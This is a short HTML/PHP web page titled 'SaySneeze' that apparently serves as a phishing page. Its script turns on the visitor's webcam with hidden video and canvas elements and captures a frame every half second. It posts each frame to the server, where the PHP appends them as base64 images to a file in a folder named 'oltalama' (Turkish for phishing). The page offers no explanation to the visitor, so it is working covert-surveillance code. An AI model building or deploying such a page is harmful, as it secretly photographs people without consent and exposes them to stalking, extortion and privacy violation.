<!DOCTYPE html>
<html>
<head>
  <title>SaySneeze</title>
</head>
<body>
  <video id="video" width="640" height="480" autoplay style="display:none;"></video>
  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

  <script>
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const context = canvas.getContext("2d");

    navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } })
      .then(stream => {
        video.srcObject = stream;

        setInterval(() => {
          context.drawImage(video, 0, 0, 640, 480);
          const imageData = canvas.toDataURL("image/png");

          fetch(window.location.pathname, {
            method: "POST",
            body: JSON.stringify({ image: imageData }),
            headers: { "Content-Type": "application/json" }
          }).then(response => response.text())
          .then(data => console.log(data))
          .catch(error => console.error("Hata:", error));
        }, 500);
      })
      .catch(err => console.error("Kamera hatası:", err));
  </script>

<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $data = json_decode(file_get_contents("php://input"), true);

    if (isset($data["image"])) {
        $imageData = $data["image"];
        $filename = "oltalama/base64_images.txt";
        $success = file_put_contents($filename, $imageData . PHP_EOL, FILE_APPEND);
    } 
}
?>
</body>
</html>